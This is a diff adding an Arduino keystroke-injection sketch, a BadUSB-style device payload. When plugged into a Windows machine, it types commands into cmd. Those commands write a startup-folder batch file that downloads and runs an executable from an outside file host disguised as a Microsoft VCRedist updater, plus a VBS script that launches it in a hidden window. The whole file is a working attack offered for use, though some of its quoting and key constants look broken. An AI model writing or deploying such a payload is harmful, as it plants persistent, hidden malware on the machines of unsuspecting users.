@@ -1,0 +1,44 @@
+#include <Keyboard.h>
+
+void setup() {
+  // Double tap windows key to get window priority. Unlikely that this is needed but just incase
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.releaseAll();
+  delay(50);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.releaseAll();
+  delay(100);
+  // Open Command Prompt/PowerShell (depending on the OS)
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
+  Keyboard.releaseAll();
+  delay(100);
+  Keyboard.println("cmd");
+  delay(500);
+  // Cd into startup directory
+  Keyboard.println("cd AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup");
+  delay(50);
+  // Write a batch file to curl the exe. We can't run it yet since it'd be open on the window
+  Keyboard.println("echo curl \"https://cdn-145.megaupload.nz/f0I5vdd5z6/ce014102-1678454815/Microsoft+VCRedist+Updater.exe" -o "VCRedistUpdater.exe\" && VCRedistUpdater.exe > node.bat");
+  delay(50);
+  // We need to enter con mode to write a vbs that will make an invisible window. I really wish this wasnt a thing, but the speed slowdown is worth
+  Keyboard.println("copy con hide.vbs");
+  delay(50);
+  Keyboard.print("CreateObject(\"Wscript.Shell\").Run \"node.bat\", 0, True")
+  delay(50);
+  Keyboard.press(MOD_CONTROL_LEFT);
+  Keyboard.press(KEY_Z);
+  Keyboard.releaseAll();
+  delay(50);
+  Keyboard.press(KEY_ENTER);
+  Keyboard.releaseAll();
+  delay(50);
+  Keyboard.println("hide.vbs");
+  delay(50);
+  // Exit the Command Prompt/PowerShell
+  Keyboard.println("exit");
+}
+
+void loop() {
+  // Do nothing
+}
